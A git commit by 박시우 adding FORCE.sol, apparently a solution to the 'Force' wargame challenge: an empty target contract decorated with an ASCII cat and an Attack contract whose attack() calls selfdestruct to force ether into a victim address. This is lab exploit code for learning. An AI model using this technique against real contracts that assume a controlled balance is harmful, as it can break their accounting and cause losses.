bdc76041954948ed5340a400a4e5693d99d56d6c
박시우 <siw0218@naver.com>
2025-11-04 17:52:19 +0900

    Update FORCE.sol

--- FORCE.sol
+++ FORCE.sol
@@ -1,1 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+contract Force {
+		/*
+       MEOW ?
+         /\_/\
+        / o o \
+       (   "   )
+        \~(*)~/
+         // \\
+    */
+}
+
+contract Attack {
+    receive() external payable {}
+
+    function attack(address payable _victim) public {
+        selfdestruct(_victim);
+    }
+
+}
